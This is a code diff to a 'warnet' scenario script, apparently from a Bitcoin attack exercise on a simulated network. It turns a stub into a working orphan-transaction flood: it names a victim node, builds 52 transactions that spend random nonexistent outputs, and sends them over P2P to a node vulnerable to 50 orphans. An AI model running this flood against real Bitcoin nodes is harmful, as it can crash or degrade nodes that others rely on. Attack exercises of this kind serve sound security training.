@@ -44,7 +44,7 @@ class Orphan50(Commander):
         parser.description = (
             "Demonstrate orphan attack using a scenario and P2PInterface"
         )
-        parser.usage = "warnet run /path/to/stub_orphan.py"
+        parser.usage = "warnet run /home/gabriel/projects/clusters/battle-of-galen-erso/scenarios/stub_orphan.py"
 
     # Scenario entrypoint
     def run_test(self):
@@ -66,7 +66,7 @@ class Orphan50(Commander):
 
         # We pick a node on the network to attack
         # Find the node that is vulnerable to 50 orphans on fork-observer
-        victim = "TARGET_TANK_NAME.default.svc"
+        victim = "tank-0035-coffee.default.svc"
 
         # regtest or signet
         chain = self.nodes[0].chain
@@ -90,30 +90,31 @@ class Orphan50(Commander):
         attacker.wait_until(lambda: attacker.is_connected, check_connected=False)
 
         # make a transaction that spends an output that doesn't exist
-        tx = CTransaction()
+        for i in range(0,52):
+                
+            tx = CTransaction()
 
-        tx.vin.append(
-            CTxIn(
-                COutPoint(
-                    int(
-                        # random made up input
-                        "e3bb40caa4d604219a7394fdc8c72f1002b31b17ddcb01ddda3ccc8a20a0c183",
-                        16,
+            random_txid = random.getrandbits(256)  # 256-bit random number
+            random_txid_hex = f"{random_txid:064x}"
+
+            tx.vin.append(
+                CTxIn(
+                    COutPoint(
+                        int(random_txid_hex, 16),  # Convert back to int
+                        0,
                     ),
-                    0,
-                ),
+                )
             )
-        )
-        tx.vout.append(
-            CTxOut(int(0.00009 * COIN), address_to_scriptpubkey(node.getnewaddress()))
-        )
+            tx.vout.append(
+                CTxOut(int(0.00009 * COIN), address_to_scriptpubkey(node.getnewaddress()))
+            )
 
-        tx.calc_sha256()
+            tx.calc_sha256()
 
-        print(tx.serialize().hex())
+            print(tx.serialize().hex())
 
-        attacker.send_and_ping(msg_tx(tx))
-
+            print("sending tx", i)
+            attacker.send_and_ping(msg_tx(tx))
         # NOW perhhaps we could do this 50 times to the node that is vulnerable to 50 orphans??
 
 
